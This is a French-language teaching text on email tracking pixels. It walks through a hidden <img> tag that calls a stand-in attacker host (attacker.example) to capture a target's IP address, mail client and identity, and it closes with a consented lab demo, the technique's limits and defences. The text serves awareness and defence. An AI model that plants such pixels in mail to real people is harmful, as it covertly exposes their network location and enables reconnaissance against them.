## Introduction : objectif et contexte

L’idée étudiée est la suivante : comment un attaquant peut récupérer l’IP publique (ou l’IP de sortie proxy) d’une cible simplement en lui envoyant un mail contenant une image distante, souvent appelée pixel de tracking.
Le mail sert alors de vecteur, et le client de messagerie de la victime joue le rôle de “proxy HTTP” involontaire, en allant chercher lui‑même l’image sur un serveur contrôlé par l’attaquant.

***

## Partie 1 – De “je veux l’IP” à “j’utilise le mail”

### 1.1 Besoin de l’attaquant

Un attaquant cherche à obtenir l’IP publique de la cible pour :

- Lier une personne / un poste / une entreprise à une adresse IP.
- Identifier la sortie Internet d’un réseau (firewall, box, proxy, VPN).
- Commencer la cartographie de la surface d’attaque externe (plages IP, FAI, ASN, hébergeurs).

Sans accès direct au réseau interne, il doit s’appuyer sur des canaux existants : Web, DNS, mails, services exposés, etc.

### 1.2 Intuition : faire travailler le client mail

Constat : un mail HTML peut charger des ressources distantes (images, CSS, etc.).
Idée clé : si la cible ouvre un mail qui contient une image hébergée chez l’attaquant, c’est le client mail de la cible qui va faire une requête HTTP vers le serveur de l’attaquant.

Conclusion : en observant cette requête HTTP, l’attaquant voit l’IP source (publique ou celle du proxy) utilisée par la cible.

***

## Partie 2 – Le tracking pixel : concept et structure

### 2.1 Qu’est‑ce qu’un tracking pixel ?

Un tracking pixel (ou “web bug”) est :

- Une image minuscule (souvent 1×1 pixel, transparente).
- Intégrée dans un contenu HTML (page web ou email).
- Chargée depuis un serveur contrôlé par celui qui veut suivre l’ouverture.

Le but n’est pas d’afficher visuellement une image, mais de déclencher une requête HTTP traçable.

### 2.2 Intégration dans un mail HTML

Dans un mail HTML, un attaquant peut inclure par exemple :

```html
<img src="https://attacker.example/pixel?uid=alice" 
     width="1" height="1" style="display:none">
```

Éléments importants :

- `src` pointe vers un serveur sous contrôle de l’attaquant.
- Le paramètre `uid` identifie la cible ou le contexte (ex. `uid=maitre`, `uid=alice`).
- `width`, `height` et `style` rendent l’image invisible pour l’utilisateur.

Lorsque le client mail affiche le message et charge les images distantes, il envoie une requête HTTP GET vers cette URL.

### 2.3 Ce que le serveur de l’attaquant peut observer

À chaque chargement du pixel, le serveur voit :

- L’IP source de la requête HTTP (vue dans les logs réseau/HTTP).
- Le User‑Agent (client de messagerie ou navigateur).
- L’URL complète, donc le paramètre `uid`.
- La date et l’heure de la requête.

En pratique, une entrée de log pourrait ressembler à :

- Date/heure : 2026‑01‑09 15:20:31
- IP source : 203.0.113.45
- User‑Agent : Microsoft Outlook 16.0
- UID : maitre

***

## Partie 3 – Scénario d’attaque étape par étape

### 3.1 Pré‑requis pour l’attaquant

Avant de lancer l’attaque, l’attaquant doit :

- Connaître au moins une adresse mail de la cible (ou d’un employé de la cible).
- Disposer d’un serveur web (ou d’une appli simple) capable :
    - de répondre à la route `/pixel`,
    - de loguer IP, User‑Agent, UID, timestamp.

Ces pré‑requis sont réalistes pour un attaquant même peu sophistiqué.

### 3.2 Préparation du serveur de pixel

L’attaquant met en place un serveur HTTP minimal qui :

1. Expose une route `/pixel` avec un paramètre `uid`.
2. À chaque requête :
    - lit l’IP source et le User‑Agent ;
    - lit la valeur de `uid` dans l’URL ;
    - écrit une ligne de log (date, IP, UA, uid) ;
    - renvoie une image 1×1 (GIF/PNG) pour que la requête soit “légitime” pour le client mail.

Ce serveur n’a pas besoin d’être complexe : quelques dizaines de lignes de code suffisent.

### 3.3 Construction et envoi du mail

Ensuite, l’attaquant :

1. Rédige un mail HTML vers la cible (contenu banal ou prétexte social‑engineering).
2. Intègre le pixel, par exemple :

```html
<img src="https://attacker.example/pixel?uid=maitre" 
     width="1" height="1" style="display:none">
```

3. Envoie le message depuis une adresse qu’il contrôle.

Le mail ressemble à un simple message texte pour la victime, l’image étant invisible.

### 3.4 Ouverture du mail par la cible

Côté cible :

- Le destinataire ouvre le mail dans son client (Outlook, Thunderbird, webmail, etc.).
- Si le client charge les images distantes, il effectue automatiquement une requête HTTP vers `https://attacker.example/pixel?uid=maitre`.
- Si le client bloque les images par défaut, l’attaquant dépend d’un clic “Afficher les images”.

À ce moment‑là, le serveur de l’attaquant reçoit et logue la requête.

### 3.5 Exploitation des logs par l’attaquant

Une fois la requête reçue, l’attaquant analyse :

- L’IP source :
    - si le mail est ouvert depuis le réseau de l’entreprise, c’est typiquement l’IP publique de la société ou celle de son proxy ;
    - si le mail est ouvert depuis un autre lieu (domicile, 4G, etc.), ce sera l’IP de ce réseau.
- Le User‑Agent :
    - indique le type de client (ex. Outlook sur Windows, webmail via Chrome, app mobile).
- L’UID :
    - lie l’IP à une personne ou un rôle précis.

Avec l’IP, l’attaquant peut ensuite :

- Faire un WHOIS pour déterminer le FAI et parfois le type d’offre (pro vs résidentiel).
- Identifier l’ASN (numéro d’autonome system) et les plages IP associées.
- Corréler plusieurs ouvertures (par exemple plusieurs employés, plusieurs sites) pour cartographier les différentes IP publiques d’une même organisation.

***

## Partie 4 – Mise en place d’une démonstration en environnement contrôlé

### 4.1 Architecture d’un lab simple

Pour une démonstration pédagogique, on peut utiliser :

- Machine A : “Serveur pixel”
    - Script de tracking (exécuté sur une VM ou une machine perso).
    - Logs visibles en direct (terminal, fichier texte).
- Machine B : “Client victime”
    - Client mail ou simple navigateur qui ouvre un mail HTML (ou une page HTML) contenant l’image.

L’idée est de montrer que l’ouverture du mail (ou de la page) déclenche une ligne de log sur la machine A.

### 4.2 Démo avec un maître de stage (scénario pédagogique)

Avec l’accord explicite du maître de stage :

1. Préparer le serveur pixel sur la machine A, prêt à loguer.
2. Envoyer un mail HTML contenant le pixel avec `uid=maitre`.
3. Lui demander d’ouvrir le mail et, si nécessaire, d’autoriser l’affichage des images.
4. Montrer en temps réel :
    - la ligne de log qui apparaît ;
    - l’adresse IP vue ;
    - le type de client ;
    - la correspondance entre l’IP obtenue et celle qu’il a déjà fournie (si c’est le même réseau).

Cette démo illustre concrètement que :

- un simple contenu HTML dans un mail suffit à faire sortir une requête HTTP vers un serveur externe ;
- la personne en face n’a rien “installé” ni “accepté” de spécial, elle a juste ouvert un mail.

***

## Partie 5 – Limites, contournements et implications

### 5.1 Limitations techniques

Plusieurs mécanismes réduisent l’efficacité ou changent la nature de l’IP récupérée :

- Proxys d’images (Gmail, Outlook web, etc.)
    - L’image est d’abord téléchargée par un serveur intermédiaire (Google, Microsoft).
    - L’IP visible côté attaquant est celle du proxy, pas directement celle du poste ou du réseau de l’utilisateur.
- Protections de confidentialité (ex. Apple Mail Privacy)
    - Les images peuvent être préchargées de manière aléatoire depuis des serveurs distants.
    - L’heure d’ouverture et l’IP réelle de l’utilisateur deviennent floues.
- Blocage des images distantes par défaut
    - Si le client n’affiche pas les images tant que l’utilisateur ne clique pas “Afficher les images”, le pixel ne se déclenche pas automatiquement.


### 5.2 Importance pour l’attaque et la défense

Pour un cours complet, ce scénario permet d’illustrer :

- Côté attaque
    - Comment une simple fonctionnalité standard (images dans les mails) peut être utilisée pour:
        - confirmer l’ouverture ;
        - récupérer des informations réseau ;
        - profiler l’environnement.
- Côté défense
    - Intérêt de bloquer le chargement automatique des images distantes.
    - Rôle des proxys d’images et des solutions de confidentialité pour masquer l’IP réelle.
    - Sensibilisation à l’idée qu’un mail “passif” peut exfiltrer des données (IP, client, horaires) sans interaction visible.